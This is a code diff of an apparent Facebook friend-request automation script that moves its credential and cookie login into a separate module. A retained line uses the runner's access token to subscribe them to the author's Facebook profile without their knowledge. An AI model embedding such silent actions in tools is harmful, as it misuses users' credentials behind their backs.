@@ -7,7 +7,7 @@ recode? oke, but don't deleted name author
 '''
 import requests,sys,os,time,json,re,click
 from http.cookiejar import LWPCookieJar as kuki
-from getpass import getpass
+from src import Genkuki
 from bs4 import BeautifulSoup as BS
 
 class Acpt:
@@ -100,44 +100,9 @@ class Dacpt:
 	; Delete all friend requests ;
 	;        by KANG-NEWBIE      ;
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;""")
-		self.login()
-
-	def login(self):
-		#follow me kids!
 		self.req.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+self.ket)
-		print("\n[!] checking cookies")
-		time.sleep(1)
-		s = self.req
-		s.cookies = kuki('toket/kue.txt')
-		try:
-			fil=open('toket/kue.txt')
-			fil.close()
-		except FileNotFoundError:
-			print("[!] cookies not found\n\n[!] please login in your facebook once again")
-			email=input('[?] email/username: ')
-			pw=getpass('[?] password: ')
-			data = {'email':email,'pass':pw}
-			res = s.post(self.u.format('/login'),data=data).text
-			if 'm_sess' in str(res) or 'save-device' in str(res):
-				s.cookies.save()
-				self.req.cookies=kuki('toket/kue.txt')
-				self.req.cookies.load()
-				self.glnk(self.u.format('/friends/center/requests'))
-				exit()
-			else:
-				exit('[!] fail login into your account')
-		self.cek_kuki()
-
-	def cek_kuki(self):
-		self.req.cookies=kuki('toket/kue.txt')
-		self.req.cookies.load()
-		cek=self.req.get('https://mbasic.facebook.com/me').text
-		if 'mbasic_logout_button' in cek:
-			print('[√] cookies found\n')
-			click.pause()
-			self.glnk(self.u.format('/friends/center/requests'))
-		else:
-			print('[!] cookies invalid')
+		Genkuki.login(self)
+		self.glnk(self.u.format('/friends/center/requests'))
 
 	def glnk(self,url):
 		rq=self.req.get(url).text
